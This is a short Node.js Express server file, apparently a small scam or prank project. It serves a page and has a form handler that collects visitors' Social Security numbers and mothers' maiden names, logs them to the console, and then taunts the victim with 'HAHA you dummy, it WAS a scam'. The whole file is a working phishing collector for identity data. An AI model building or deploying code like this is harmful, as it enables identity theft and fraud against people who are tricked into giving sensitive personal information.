var express = require('express');
var app = express();
var bodyParser = require('body-parser');
app.listen(3000, function(){
	console.log("you're connected");
});

app.use(bodyParser.urlencoded({extended:true}));

app.get("/",function(req,res){
	console.log('someone visited your site!!');
	res.render('home.ejs');
});

app.post('/posturl',function(req,res){
	var info = [req.body.ssn, req.body.mname];
	console.log('Here is the personal info:')
	console.log('SSN :' + info[0]);
	console.log('mname :' + info[1]);
	res.send("<h1>HAHA you dummy, it WAS a scam</h1>");
})